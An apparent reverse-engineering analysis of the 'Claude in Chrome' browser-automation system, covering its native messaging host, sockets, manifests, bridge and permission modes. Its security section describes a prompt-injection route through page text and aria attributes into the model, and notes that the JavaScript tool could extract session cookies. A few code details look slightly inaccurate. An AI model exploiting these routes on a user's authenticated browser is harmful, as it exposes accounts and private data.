# Claude in Chrome: Deep Reverse Engineering Analysis

## Executive Summary

Claude in Chrome is a sophisticated three-tier browser automation system that enables Claude Code (running on the user's local machine) to control and interact with authenticated websites in the user's actual Chrome browser. The architecture spans from the CLI to a native messaging host to a Chrome extension, with optional WebSocket bridging for ant users. This document provides a comprehensive technical reverse engineering analysis of the entire stack.

---

## 1. Architecture: Three-Tier System Design

### 1.1 Overall Design

The system consists of three primary tiers:

```
┌─────────────────────────────────────────────────────┐
│  Tier 1: Claude Code (Node.js CLI)                 │
│  - MCP Server (stdio transport)                     │
│  - Context factory & socket setup                  │
│  - Auth token management (OAuth)                    │
│  - Analytics & telemetry                           │
└──────────────────────┬──────────────────────────────┘
                       │
           ┌───────────┴───────────┐
           │                       │
    Socket │                       │ WebSocket (Ant only)
  (Optional)│                       │
           │                       │
┌──────────v──────────────────┐   │   ┌──────────────────────────┐
│  Tier 2: Chrome Native Host │   │   │  Bridge (wss://...)       │
│  (TypeScript in Node)       │   │   │  OAuth2 relay             │
│  - stdio message reader     │   │   │  (Staggi/Prod endpoints)  │
│  - Socket server listener   │   └──→│  (ant only, feature flag) │
│  - Message routing          │       └──────────────┬───────────┘
│  - Multi-client broadcast   │                      │
│  - Stale socket cleanup     │                      │
└──────────────────┬──────────┘                      │
                   │                                 │
          Native messaging                           │
          protocol                                   │
                   │                                 │
┌──────────────────v──────────────────────────────────┴─────┐
│  Tier 3: Chrome Extension                                 │
│  - @ant/claude-for-chrome-mcp (MCP integration)          │
│  - Browser automation tools (tabs, click, navigate, etc) │
│  - ARIA snapshot generation                             │
│  - Screenshot capture                                   │
│  - JavaScript execution                                 │
│  - Tab lifecycle management                             │
└──────────────────────────────────────────────────────────┘
                   │
                   │ DOM events
                   │
           ┌───────v────────┐
           │  Web Pages     │
           │  (in user's    │
           │  authenticated │
           │  Chrome)       │
           └────────────────┘
```

### 1.2 Component Details

**Tier 1: Claude Code**
- Runs as Node.js process spawned from CLI
- Uses `StdioServerTransport` for MCP communication with Claude
- Manages OAuth tokens and authenticated session state
- Initializes bridge connection (if enabled) with credentials
- Handles analytics filtering and safe string allowlisting
- Provides system prompt with browser automation guidelines

**Tier 2: Chrome Native Host**
- Pure TypeScript implementation (replaced previous Rust NAPI binding)
- Stdio bridge to Chrome Extension (native messaging protocol)
- Unix socket listener for MCP client connections
- Message routing and multi-client broadcast
- Stale socket cleanup (PID-based)
- Windows named pipes support (`\\\\.\\pipe\\...`)

**Tier 3: Chrome Extension**
- Implements `@ant/claude-for-chrome-mcp` package
- Provides `createClaudeForChromeMcpServer` factory
- Exposes browser automation tools via MCP
- Manages tab state, ARIA snapshots, screenshots
- Two connection paths: native socket OR WebSocket bridge

---

## 2. Communication Protocol: Native Messaging with Length-Prefix JSON

### 2.1 Chrome Native Messaging Standard

The native messaging protocol uses a **4-byte little-endian length prefix** followed by JSON payload:

```
┌──────────────┬──────────────────────────────────┐
│ 4 bytes (LE) │     JSON Message                 │
│ uint32 length│     (UTF-8 encoded)              │
└──────────────┴──────────────────────────────────┘
```

**Implementation Details:**

From `chromeNativeHost.ts`:

```typescript
// Sending messages to Chrome
function sendChromeMessage(message: string): void {
  const jsonBytes = Buffer.from(message, 'utf-8')
  const lengthBuffer = Buffer.alloc(4)
  lengthBuffer.writeUInt32LE(jsonBytes.length, 0)  // Write 4-byte LE length

  process.stdout.write(lengthBuffer)
  process.stdout.write(jsonBytes)
}

// Reading messages from Chrome
const length = buffer.readUInt32LE(0)  // Read 4-byte LE length
const messageBytes = buffer.slice(4, 4 + length)
const message = messageBytes.toString('utf-8')
```

### 2.2 Message Types and Flow

**From Chrome Extension to Native Host (via stdio):**

- `tool_request`: Tool invocation with method name and params
  - Contains `method` and `params` fields
  - Routed to Claude Code via MCP socket

- `notification`: Notification from extension
  - Broadcast to all MCP clients

**From Native Host to Chrome Extension (via stdio):**

- `tool_response`: Response to a tool call
  - Contains result data for the extension to process

- `notification`: Broadcast notifications
  - Sent to all MCP clients simultaneously

- `ping`/`pong`: Keep-alive heartbeat
- `get_status`: Status check
- `error`: Error messages

**From Claude Code to Native Host (via Unix socket):**

- Tool requests from MCP layer are forwarded to Chrome
- Requests use 4-byte length prefix same as stdio protocol

### 2.3 Size Limits and Validation

From `chromeNativeHost.ts`:

```typescript
const MAX_MESSAGE_SIZE = 1024 * 1024  // 1MB max message

// Validation in message reader
if (length === 0 || length > MAX_MESSAGE_SIZE) {
  log(`Invalid message length: ${length}`)
  // Close connection
}
```

### 2.4 Multi-Client Broadcast Architecture

The native host maintains a `Map<clientId, McpClient>` where each client is:

```typescript
type McpClient = {
  id: number           // Auto-incrementing ID
  socket: Socket       // TCP socket from MCP server
  buffer: Buffer       // Buffered incoming data
}
```

When a `tool_response` arrives from Chrome:
1. Native host extracts data (strips `type` field)
2. Wraps in 4-byte length prefix
3. **Broadcasts to ALL connected MCP clients** (line 306-312)

This enables multiple MCP instances to share the same extension connection.

---

## 3. Chrome Native Host Implementation

### 3.1 Architecture

The `ChromeNativeHost` class provides three main responsibilities:

1. **stdio bridge**: Read/write Chrome native messages
2. **Socket listener**: Accept MCP client connections
3. **Message routing**: Forward between Chrome and MCP clients

### 3.2 Startup and Socket Creation

From `chromeNativeHost.ts`:

```typescript
async start(): Promise<void> {
  this.socketPath = getSecureSocketPath()

  // Unix only: create socket directory
  if (platform() !== 'win32') {
    await mkdir(socketDir, { recursive: true, mode: 0o700 })
    await chmod(socketDir, 0o700)  // Enforce permissions

    // Clean up stale sockets from dead processes
    const files = await readdir(socketDir)
    for (const file of files) {
      const pid = parseInt(file.replace('.sock', ''), 10)
      try {
        process.kill(pid, 0)  // Test if process alive
        // Process alive, leave socket
      } catch {
        // Process dead, remove stale socket
        await unlink(join(socketDir, file))
      }
    }
  }

  // Create listening server
  this.server = createServer(socket => this.handleMcpClient(socket))
  await new Promise<void>((resolve, reject) => {
    this.server!.listen(this.socketPath!, ...)
  })

  // Set socket permissions on Unix
  if (platform() !== 'win32') {
    await chmod(this.socketPath!, 0o600)
  }
}
```

**Key points:**
- Socket directory: `/tmp/claude-mcp-browser-bridge-{username}/`
- Socket file: `/tmp/claude-mcp-browser-bridge-{username}/{pid}.sock`
- Directory permissions: `0o700` (rwx------)
- Socket file permissions: `0o600` (rw-------)
- Windows uses named pipes: `\\\\.\\pipe\\claude-mcp-browser-bridge-{username}`

### 3.3 MCP Client Connection Handling

When a client connects via socket:

```typescript
private handleMcpClient(socket: Socket): void {
  const client: McpClient = {
    id: this.nextClientId++,
    socket,
    buffer: Buffer.alloc(0)
  }

  this.mcpClients.set(client.id, client)

  // Notify Chrome of new connection
  sendChromeMessage(jsonStringify({
    type: 'mcp_connected'
  }))

  socket.on('data', (data: Buffer) => {
    client.buffer = Buffer.concat([client.buffer, data])

    // Process complete messages (with length prefix)
    while (client.buffer.length >= 4) {
      const length = client.buffer.readUInt32LE(0)

      if (length === 0 || length > MAX_MESSAGE_SIZE) {
        socket.destroy()
        return
      }

      if (client.buffer.length < 4 + length) {
        break  // Wait for more data
      }

      const messageBytes = client.buffer.slice(4, 4 + length)
      client.buffer = client.buffer.slice(4 + length)

      // Parse and forward to Chrome
      const request = jsonParse(messageBytes.toString('utf-8'))
      sendChromeMessage(jsonStringify({
        type: 'tool_request',
        method: request.method,
        params: request.params
      }))
    }
  })

  socket.on('close', () => {
    this.mcpClients.delete(client.id)

    // Notify Chrome of disconnection
    sendChromeMessage(jsonStringify({
      type: 'mcp_disconnected'
    }))
  })
}
```

### 3.4 Shutdown and Cleanup

```typescript
async stop(): Promise<void> {
  // Close all MCP clients
  for (const [, client] of this.mcpClients) {
    client.socket.destroy()
  }

  // Close server
  if (this.server) {
    await new Promise<void>(resolve => {
      this.server!.close(() => resolve())
    })
  }

  // Clean up socket file
  if (platform() !== 'win32') {
    await unlink(this.socketPath)

    // Remove directory if empty
    const remaining = await readdir(socketDir)
    if (remaining.length === 0) {
      await rmdir(socketDir)
    }
  }
}
```

---

## 4. MCP Server Setup: Bridge Configuration and Context

### 4.1 Chrome Context Factory

The `createChromeContext()` function in `mcpServer.ts` builds the `ClaudeForChromeContext` that's passed to `createClaudeForChromeMcpServer()`:

```typescript
export function createChromeContext(
  env?: Record<string, string>
): ClaudeForChromeContext {
  const logger = new DebugLogger()
  const chromeBridgeUrl = getChromeBridgeUrl()

  return {
    serverName: 'Claude in Chrome',
    logger,
    socketPath: getSecureSocketPath(),
    getSocketPaths: getAllSocketPaths,
    clientTypeId: 'claude-code',
    // ... auth callbacks, device pairing, etc
    // ... bridge config, lightning inference setup
    trackEvent: (eventName, metadata) => { ... }
  }
}
```

### 4.2 Bridge URL Resolution

From `mcpServer.ts`, the bridge is enabled based on:

1. **User type**: Ant users always get bridge
2. **Feature flag**: `tengu_copper_bridge` for public users
3. **Environment overrides**:
   - `USE_LOCAL_OAUTH` or `LOCAL_BRIDGE` → `ws://localhost:8765`
   - `USE_STAGING_OAUTH` → `wss://bridge-staging.claudeusercontent.com`
   - Default production → `wss://bridge.claudeusercontent.com`

**Bridge connection:**

```typescript
...(chromeBridgeUrl && {
  bridgeConfig: {
    url: chromeBridgeUrl,
    getUserId: async () => {
      return getGlobalConfig().oauthAccount?.accountUuid
    },
    getOAuthToken: async () => {
      return getClaudeAIOAuthTokens()?.accessToken ?? ''
    },
    ...(isLocalBridge() && { devUserId: 'dev_user_local' })
  }
})
```

**WebSocket endpoint details:**
- Production: `wss://bridge.claudeusercontent.com`
- Staging: `wss://bridge-staging.claudeusercontent.com`
- Local dev: `ws://localhost:8765`

The bridge handles OAuth authentication and relays messages between Claude Code and the extension for users who can't use direct socket connections.

### 4.3 Device Pairing and Persistence

Device pairing information is stored in `~/.claude.json`:

```typescript
onExtensionPaired: (deviceId: string, name: string) => {
  saveGlobalConfig(config => ({
    ...config,
    chromeExtension: {
      pairedDeviceId: deviceId,
      pairedDeviceName: name
    }
  }))
}

getPersistedDeviceId: () => {
  return getGlobalConfig().chromeExtension?.pairedDeviceId
}
```

### 4.4 Lightning Mode (Ant Only)

For ant users, the extension's `lightning_turn` tool is injected for in-browser agent loop execution:

```typescript
...(process.env.USER_TYPE === 'ant' && {
  callAnthropicMessages: async (req: {
    model: string
    max_tokens: number
    system: string
    messages: ...
    stop_sequences?: string[]
    signal?: AbortSignal
  }): Promise<...> => {
    const response = await sideQuery({
      model: req.model,
      system: req.system,
      messages: req.messages,
      max_tokens: req.max_tokens,
      skipSystemPromptPrefix: true,  // Don't add CLI prefix
      tools: [],  // No tools in lightning loop
      querySource: 'chrome_mcp'
    })
    // Extract text blocks only (filter out thinking, tool use)
    return { content: textBlocks, stop_reason, usage }
  }
})
```

**Key insight:** Lightning mode is build-time gated via `import.meta.env.ANT_ONLY_BUILD` in the extension. Without this gate, the Node MCP server's `ListTools` filters out `browser_task` and `lightning_turn`, so external users never see them advertised.

---

## 5. Setup & Installation: Wrapper Scripts and Manifest Files

### 5.1 Wrapper Script Generation

Since Chrome's native host manifest `path` field cannot contain arguments, Claude Code creates wrapper scripts:

**Unix wrapper** (`~/.claude/chrome/chrome-native-host`):
```bash
#!/bin/sh
# Chrome native host wrapper script
# Generated by Claude Code - do not edit manually
exec "/path/to/node" --chrome-native-host
```

**Windows wrapper** (`%USERPROFILE%\.claude\chrome\chrome-native-host.bat`):
```batch
@echo off
REM Chrome native host wrapper script
REM Generated by Claude Code - do not edit manually
"/path/to/node" --chrome-native-host
```

**Generation code** (from `setup.ts`):

```typescript
async function createWrapperScript(command: string): Promise<string> {
  const chromeDir = join(getClaudeConfigHomeDir(), 'chrome')
  const wrapperPath = platform === 'windows'
    ? join(chromeDir, 'chrome-native-host.bat')
    : join(chromeDir, 'chrome-native-host')

  await mkdir(chromeDir, { recursive: true })
  await writeFile(wrapperPath, scriptContent)

  if (platform !== 'windows') {
    await chmod(wrapperPath, 0o755)  // Make executable
  }

  return wrapperPath
}
```

### 5.2 Native Host Manifest Installation

**Manifest JSON** (installed to each browser's native messaging directory):

```json
{
  "name": "com.anthropic.claude_code_browser_extension",
  "description": "Claude Code Browser Extension Native Host",
  "path": "/path/to/wrapper/script",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://fcoeoabgfenejglbffodgkkbkcdhcgfn/",
    "chrome-extension://dihbgbndebgnbjfmelmegjepbnkhlgni/",
    "chrome-extension://dngcpimnedloihjnnfngkgjoidhnaolf/"
  ]
}
```

**Installation locations:**

From `setup.ts`:

```typescript
function getNativeMessagingHostsDirs(): string[] {
  const platform = getPlatform()

  if (platform === 'windows') {
    const appData = process.env.APPDATA || join(home, 'AppData', 'Local')
    return [join(appData, 'Claude Code', 'ChromeNativeHost')]
  }

  // macOS and Linux: return all browser native messaging directories
  return getAllNativeMessagingHostsDirs().map(({ path }) => path)
}
```

**Per-browser paths:**

- **Chrome (macOS)**: `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/`
- **Chrome (Linux)**: `~/.config/google-chrome/NativeMessagingHosts/`
- **Chrome (Windows)**: Registry `HKCU\Software\Google\Chrome\NativeMessagingHosts`

- **Brave (macOS)**: `~/Library/Application Support/BraveSoftware/Brave-Browser/NativeMessagingHosts/`
- **Brave (Linux)**: `~/.config/BraveSoftware/Brave-Browser/NativeMessagingHosts/`

- **Arc (macOS)**: `~/Library/Application Support/Arc/User Data/NativeMessagingHosts/`
- **Arc (Windows)**: Registry `HKCU\Software\ArcBrowser\Arc\NativeMessagingHosts`

- **Edge (macOS)**: `~/Library/Application Support/Microsoft Edge/NativeMessagingHosts/`
- **Edge (Linux)**: `~/.config/microsoft-edge/NativeMessagingHosts/`
- **Edge (Windows)**: Registry `HKCU\Software\Microsoft\Edge\NativeMessagingHosts`

- **Chromium (macOS)**: `~/Library/Application Support/Chromium/NativeMessagingHosts/`
- **Chromium (Linux)**: `~/.config/chromium/NativeMessagingHosts/`

- **Vivaldi (macOS)**: `~/Library/Application Support/Vivaldi/NativeMessagingHosts/`
- **Vivaldi (Linux)**: `~/.config/vivaldi/NativeMessagingHosts/`

- **Opera (macOS)**: `~/Library/Application Support/com.operasoftware.Opera/NativeMessagingHosts/`
- **Opera (Linux)**: `~/.config/opera/NativeMessagingHosts/`
- **Opera (Windows)**: Registry using **Roaming** AppData instead of Local

### 5.3 Windows Registry Setup

From `setup.ts`:

```typescript
function registerWindowsNativeHosts(manifestPath: string): void {
  const registryKeys = getAllWindowsRegistryKeys()

  for (const { browser, key } of registryKeys) {
    const fullKey = `${key}\\${NATIVE_HOST_IDENTIFIER}`

    execFileNoThrowWithCwd('reg', [
      'add',
      fullKey,
      '/ve',    // Set default (unnamed) value
      '/t', 'REG_SZ',
      '/d', manifestPath,
      '/f'      // Force overwrite
    ])
  }
}
```

**Registry keys by browser:**
- Chrome: `HKCU\Software\Google\Chrome\NativeMessagingHosts`
- Brave: `HKCU\Software\BraveSoftware\Brave-Browser\NativeMessagingHosts`
- Arc: `HKCU\Software\ArcBrowser\Arc\NativeMessagingHosts`
- Edge: `HKCU\Software\Microsoft\Edge\NativeMessagingHosts`
- Chromium: `HKCU\Software\Chromium\NativeMessagingHosts`
- Vivaldi: `HKCU\Software\Vivaldi\NativeMessagingHosts`
- Opera: `HKCU\Software\Opera Software\Opera Stable\NativeMessagingHosts`

### 5.4 First-Time Install Detection

```typescript
if (anyManifestUpdated) {
  void isChromeExtensionInstalled().then(isInstalled => {
    if (isInstalled) {
      logForDebugging(
        `[Claude in Chrome] First-time install detected, opening reconnect page in browser`
      )
      void openInChrome(CHROME_EXTENSION_RECONNECT_URL)
    }
  })
}
```

When manifests are first written, Claude Code automatically opens `https://clau.de/chrome/reconnect` in the browser to trigger extension reinitialization.

---

## 6. Multi-Browser Support: Platform-Specific Paths

### 6.1 Supported Browsers

The system supports **7 Chromium-based browsers**:

1. **Chrome** (all platforms)
2. **Brave** (all platforms)
3. **Arc** (macOS, Windows only)
4. **Edge** (all platforms)
5. **Chromium** (all platforms)
6. **Vivaldi** (all platforms)
7. **Opera** (all platforms, Roaming AppData on Windows)

### 6.2 Browser Detection Order

From `common.ts`:

```typescript
export const BROWSER_DETECTION_ORDER: ChromiumBrowser[] = [
  'chrome',    // Most common first
  'brave',
  'arc',
  'edge',
  'chromium',
  'vivaldi',
  'opera',
]
```

### 6.3 Detection Methods by Platform

**macOS:**
```typescript
case 'macos': {
  const appPath = `/Applications/${config.macos.appName}.app`
  const stats = await stat(appPath)
  if (stats.isDirectory()) return browserId
}
```
Checks for application bundles in `/Applications/`.

**Linux/WSL:**
```typescript
case 'wsl':
case 'linux': {
  for (const binary of config.linux.binaries) {
    if (await which(binary).catch(() => null)) {
      return browserId
    }
  }
}
```
Uses `which` to find executables.

**Windows:**
```typescript
case 'windows': {
  const dataPath = join(appDataBase, ...config.windows.dataPath)
  const stats = await stat(dataPath)
  if (stats.isDirectory()) return browserId
}
```
Checks for AppData directory existence.

### 6.4 Complete Browser Configuration

From `common.ts`, each browser defines:

```typescript
type BrowserConfig = {
  name: string
  macos: {
    appName: string
    dataPath: string[]
    nativeMessagingPath: string[]
  }
  linux: {
    binaries: string[]
    dataPath: string[]
    nativeMessagingPath: string[]
  }
  windows: {
    dataPath: string[]
    registryKey: string
    useRoaming?: boolean
  }
}
```

**Example - Brave:**
```typescript
brave: {
  name: 'Brave',
  macos: {
    appName: 'Brave Browser',
    dataPath: ['Library', 'Application Support', 'BraveSoftware', 'Brave-Browser'],
    nativeMessagingPath: [
      'Library',
      'Application Support',
      'BraveSoftware',
      'Brave-Browser',
      'NativeMessagingHosts'
    ]
  },
  linux: {
    binaries: ['brave-browser', 'brave'],
    dataPath: ['.config', 'BraveSoftware', 'Brave-Browser'],
    nativeMessagingPath: ['.config', 'BraveSoftware', 'Brave-Browser', 'NativeMessagingHosts']
  },
  windows: {
    dataPath: ['BraveSoftware', 'Brave-Browser', 'User Data'],
    registryKey: 'HKCU\\Software\\BraveSoftware\\Brave-Browser\\NativeMessagingHosts'
  }
}
```

---

## 7. Socket Infrastructure: Unix Domain Sockets and Named Pipes

### 7.1 Socket Path Resolution

From `common.ts`:

```typescript
export function getSecureSocketPath(): string {
  if (platform() === 'win32') {
    return `\\\\.\\pipe\\${getSocketName()}`
  }
  return join(getSocketDir(), `${process.pid}.sock`)
}

export function getSocketDir(): string {
  return `/tmp/claude-mcp-browser-bridge-${getUsername()}`
}

function getSocketName(): string {
  return `claude-mcp-browser-bridge-${getUsername()}`
}

function getUsername(): string {
  try {
    return userInfo().username || 'default'
  } catch {
    return process.env.USER || process.env.USERNAME || 'default'
  }
}
```

**Unix paths:**
- Directory: `/tmp/claude-mcp-browser-bridge-{username}/`
- Socket: `/tmp/claude-mcp-browser-bridge-{username}/{pid}.sock`
- Example: `/tmp/claude-mcp-browser-bridge-john/12345.sock`

**Windows paths:**
- Named pipe: `\\\\.\\pipe\\claude-mcp-browser-bridge-{username}`
- Example: `\\\\.\\pipe\\claude-mcp-browser-bridge-john`

### 7.2 Socket Permissions (Unix)

From `chromeNativeHost.ts`:

```typescript
// Create directory with restrictive permissions
await mkdir(socketDir, { recursive: true, mode: 0o700 })
// owner: rwx (7)
// group: --- (0)
// other: --- (0)

// Set socket file permissions
await chmod(this.socketPath!, 0o600)
// owner: rw- (6)
// group: --- (0)
// other: --- (0)
```

These permissions ensure:
- Only the owning user can create, modify, or delete the socket
- No group or world access
- Prevention of socket hijacking by other users

### 7.3 Stale Socket Cleanup

From `chromeNativeHost.ts`:

```typescript
// Clean up stale sockets from dead processes
try {
  const files = await readdir(socketDir)
  for (const file of files) {
    if (!file.endsWith('.sock')) continue

    const pid = parseInt(file.replace('.sock', ''), 10)
    if (isNaN(pid)) continue

    try {
      process.kill(pid, 0)  // Test if process alive (signal 0)
      // Process is alive, leave it
    } catch {
      // Process is dead, remove stale socket
      await unlink(join(socketDir, file)).catch(() => {})
      log(`Removed stale socket for PID ${pid}`)
    }
  }
} catch {
  // Ignore errors scanning directory
}
```

**How it works:**
- Uses POSIX signal 0 to test if a process exists (no signal actually sent)
- Only runs at native host startup
- Safely removes `.sock` files whose PIDs are no longer running
- Ignores non-`.sock` files and unparseable names

### 7.4 Socket Fallback Paths

From `common.ts`:

```typescript
export function getAllSocketPaths(): string[] {
  // Windows uses named pipes
  if (platform() === 'win32') {
    return [`\\\\.\\pipe\\${getSocketName()}`]
  }

  const paths: string[] = []
  const socketDir = getSocketDir()

  // Scan for *.sock files in directory
  try {
    const files = readdirSync(socketDir)
    for (const file of files) {
      if (file.endsWith('.sock')) {
        paths.push(join(socketDir, file))
      }
    }
  } catch {
    // Directory may not exist yet
  }

  // Legacy fallback paths
  const legacyName = `claude-mcp-browser-bridge-${getUsername()}`
  const legacyTmpdir = join(tmpdir(), legacyName)
  const legacyTmp = `/tmp/${legacyName}`

  if (!paths.includes(legacyTmpdir)) {
    paths.push(legacyTmpdir)
  }
  if (legacyTmpdir !== legacyTmp && !paths.includes(legacyTmp)) {
    paths.push(legacyTmp)
  }

  return paths
}
```

**Fallback order:**
1. PID-based socket files in directory: `{socketDir}/{pid}.sock`
2. Legacy Unix socket: `$(tmpdir())/claude-mcp-browser-bridge-{username}`
3. Legacy fallback: `/tmp/claude-mcp-browser-bridge-{username}`

This ensures compatibility with old native host versions and different temp directory layouts.

---

## 8. Tool Execution Flow: What Claude Sees and Sends

### 8.1 Tool Types

From `@ant/claude-for-chrome-mcp` (referenced via `BROWSER_TOOLS`), the extension exposes tools for:

**Navigation & Tabs:**
- `navigate`: Load a URL in a tab
- `tabs_context_mcp`: Get current tab info
- `tabs_create_mcp`: Create a new tab
- `tabs_close_mcp`: Close a tab

**Interaction:**
- `left_click`: Click element at coordinates or by ref
- `type`: Type text into focused element
- `scroll`: Scroll page
- `key`: Press keyboard keys
- `form_input`: Set form field values
- `file_upload`: Upload files to inputs

**Observation:**
- `screenshot`: Capture page screenshot
- `read_page`: Get accessibility tree (ARIA snapshot)
- `get_page_text`: Extract plain text content
- `find`: Find elements by natural language

**Advanced:**
- `javascript_tool`: Execute arbitrary JavaScript
- `read_console_messages`: Read browser console output
- `read_network_requests`: Get HTTP request logs

**Utilities:**
- `gif_creator`: Record and export GIF animations
- `shortcuts_list`: List available shortcuts
- `shortcuts_execute`: Run a shortcut

### 8.2 What Claude Sees: ARIA Snapshots

The `read_page` tool returns an accessibility tree in ARIA format:

```typescript
// Example structure
{
  type: 'link',
  role: 'link',
  name: 'Click me',
  ref: 'ref_1',
  url: 'https://example.com',
  // ... more properties
}
```

**Key fields Claude uses:**
- `ref`: Element reference for other tool calls
- `role`: ARIA role (button, link, textbox, etc)
- `name`: Accessible name (visible text or aria-label)
- `type`: DOM element type
- `value`: Current value (for inputs)
- `disabled`: Whether element is disabled
- `visible`: Whether element is on-screen

### 8.3 What Claude Sends: Tool Requests

Example tool invocation from Claude:

```typescript
{
  method: 'left_click',
  params: {
    coordinate: [640, 320]  // x, y pixels
  }
}
```

Or by element reference:

```typescript
{
  method: 'left_click',
  params: {
    ref: 'ref_15'  // From previous ARIA snapshot
  }
}
```

**Tool request flow:**

```
Claude Code (MCP)
    ↓
Native Host (stdio to Chrome Extension)
    ↓
Chrome Extension
    ↓
Execute in Browser (DOM manipulation, navigation, etc)
    ↓
Chrome Extension (collect ARIA snapshot, screenshot)
    ↓
Native Host (stdio from Chrome Extension)
    ↓
MCP Transport
    ↓
Claude (sees result)
```

### 8.4 Screenshot Capture

When Claude calls `screenshot`, the extension:

1. Renders the current page to a canvas
2. Encodes as PNG
3. Base64-encodes the binary data
4. Returns as `data:image/png;base64,...` data URI
5. MCP transport passes to Claude
6. Claude's vision model processes the image

### 8.5 JavaScript Execution

The `javascript_tool` allows arbitrary code execution:

```typescript
{
  method: 'javascript_tool',
  params: {
    action: 'javascript_exec',
    text: 'document.title',
    tabId: 15
  }
}
```

Returns the value of the last expression:
```json
{
  result: "Page Title"
}
```

**Use cases:**
- Extract computed styles: `getComputedStyle(el).color`
- Query DOM: `document.querySelectorAll('input').length`
- Test page state: `window.myApp?.state`
- Dismiss dialogs: `window.alert.call = () => {}`

---

## 9. Tab Management: Lifecycle and Context

### 9.1 Tab Tracking

From `common.ts`:

```typescript
const MAX_TRACKED_TABS = 200
const trackedTabIds = new Set<number>()

export function trackClaudeInChromeTabId(tabId: number): void {
  if (trackedTabIds.size >= MAX_TRACKED_TABS && !trackedTabIds.has(tabId)) {
    trackedTabIds.clear()  // Reset if at limit and new tab
  }
  trackedTabIds.add(tabId)
}

export function isTrackedClaudeInChromeTabId(tabId: number): boolean {
  return trackedTabIds.has(tabId)
}
```

**Constraints:**
- Maximum 200 tracked tabs in memory
- Cache resets when limit is reached and new tab encountered
- Prevents memory leak from long-running sessions

### 9.2 Tab Context API

The `tabs_context_mcp` tool returns current browser tabs:

```typescript
{
  tabId: 15,
  url: 'https://example.com',
  title: 'Example Domain',
  active: true,
  windowId: 1,
  status: 'complete'  // 'loading' | 'complete'
}
```

Claude uses this at session startup to understand what tabs are already open.

### 9.3 Tab Lifecycle

**Creation:**
```typescript
{
  method: 'tabs_create_mcp',
  params: {}
}
// Returns new tab ID
```

**Navigation:**
```typescript
{
  method: 'navigate',
  params: {
    url: 'https://example.com',
    tabId: 15
  }
}
```

**Closing:**
```typescript
{
  method: 'tabs_close_mcp',
  params: {
    tabId: 15
  }
}
```

### 9.4 Tab State in Extension

The extension maintains per-tab state:
- Current URL and DOM
- ARIA tree cache
- Screenshot buffer
- JavaScript execution context
- Network request history (via `read_network_requests`)

---

## 10. Analytics & Telemetry: Safe String Key Allowlist

### 10.1 Analytics Event Filtering

From `mcpServer.ts`:

```typescript
const SAFE_BRIDGE_STRING_KEYS = new Set([
  'bridge_status',
  'error_type',
  'tool_name',
])

function trackEvent(eventName, metadata) {
  const safeMetadata = {}

  if (metadata) {
    for (const [key, value] of Object.entries(metadata)) {
      // Rename 'status' to 'bridge_status' to avoid Datadog reserved field
      const safeKey = key === 'status' ? 'bridge_status' : key

      if (typeof value === 'boolean' || typeof value === 'number') {
        safeMetadata[safeKey] = value  // Always allow bool/number
      } else if (
        typeof value === 'string' &&
        SAFE_BRIDGE_STRING_KEYS.has(safeKey)
      ) {
        // Only forward allowlisted string keys
        safeMetadata[safeKey] = value
      }
      // Reject other string values (could contain page content/PII)
    }
  }

  logEvent(eventName, safeMetadata)
}
```

### 10.2 PII Filtering Rules

**Never forwarded to analytics:**
- `error_message`: Could contain page content or user data
- `response_data`: Extension tool responses
- `page_content`: DOM or text content
- `console_output`: Unfiltered browser console
- Custom string metadata keys

**Always forwarded:**
- Booleans: `is_connected`, `has_extension`, `auto_enabled`
- Numbers: `latency_ms`, `client_count`, `message_size`
- Allowlisted strings: `bridge_status`, `error_type`, `tool_name`

### 10.3 Telemetry Points

From the code structure, analytics are tracked for:
- Bridge connection status
- Tool execution success/failure
- Extension pairing events
- Socket lifecycle events
- Authentication errors

---

## 11. Feature Flags and Configuration

### 11.1 Bridge Enablement

From `mcpServer.ts`:

```typescript
function getChromeBridgeUrl(): string | undefined {
  const bridgeEnabled =
    process.env.USER_TYPE === 'ant' ||
    getFeatureValue_CACHED_MAY_BE_STALE('tengu_copper_bridge', false)

  if (!bridgeEnabled) {
    return undefined  // Use native socket instead
  }

  // ... determine endpoint
}
```

**Enables bridge if:**
- User is ant (internal), OR
- `tengu_copper_bridge` feature flag is true (public)

**Bridge disabled:**
- Falls back to native Unix socket / Windows named pipe
- Direct connection from Claude Code to native host

### 11.2 Permission Modes

From `mcpServer.ts`:

```typescript
type PermissionMode =
  | 'ask'
  | 'skip_all_permission_checks'
  | 'follow_a_plan'

const initialPermissionMode: PermissionMode | undefined
if (rawPermissionMode) {
  if (isPermissionMode(rawPermissionMode)) {
    initialPermissionMode = rawPermissionMode
  }
}
```

**Via environment:**
- `CLAUDE_CHROME_PERMISSION_MODE=ask` (default)
- `CLAUDE_CHROME_PERMISSION_MODE=skip_all_permission_checks`
- `CLAUDE_CHROME_PERMISSION_MODE=follow_a_plan`

**Via session bypass:**
```typescript
if (getSessionBypassPermissionsMode()) {
  env.CLAUDE_CHROME_PERMISSION_MODE = 'skip_all_permission_checks'
}
```

### 11.3 Lightning Mode

From `mcpServer.ts`:

```typescript
...(process.env.USER_TYPE === 'ant' && {
  callAnthropicMessages: async (req) => {
    // Only available to ant users
    // Enables in-browser agent loop via extension's lightning_turn tool
    const response = await sideQuery({
      model: req.model,
      system: req.system,
      messages: req.messages,
      skipSystemPromptPrefix: true,
      tools: [],
      querySource: 'chrome_mcp'
    })
  }
})
```

**Gating:**
1. **Runtime check**: `process.env.USER_TYPE === 'ant'`
2. **Build-time gate**: Extension uses `import.meta.env.ANT_ONLY_BUILD`
3. **MCP ListTools filter**: Excludes if not available
4. **Result**: Three independent gates prevent public exposure

---

## 12. Security Considerations

### 12.1 DOM Content Injection Risk

**Critical issue:** Web content (page HTML, CSS, JavaScript) flows to Claude without sanitization:

```
Chrome Extension (DOM inspection)
    ↓ [No sanitization]
Claude (sees all page content)
```

**Attack surface:**
- Malicious JavaScript in page could inject commands into ARIA snapshot
- HTML content in nodes could contain embedded instructions
- CSS content attributes could carry injected data
- `data-*` attributes are user-controllable

**Mitigations in place:**
- Extension only returns ARIA accessibility tree (limited structure)
- Not passing raw HTML, only computed properties
- Claude's own injection defense filters instructions from observed content

**Residual risk:**
- Sophisticated JavaScript on the page could manipulate DOM properties
- `aria-label` and `aria-description` are direct text from page
- `title` attributes are user-controllable

### 12.2 Cookie and Session Exposure

**Risk:** Claude has access to authenticated browser session:

```
Claude Code
    ↓
Native Host
    ↓
Chrome Extension
    ↓
User's authenticated session (cookies, localStorage, sessionStorage)
```

**Mitigations:**
- No direct API to extract cookies
- JavaScript execution (`javascript_tool`) could extract cookies if misused
- Prompt guidelines warn against reading sensitive data

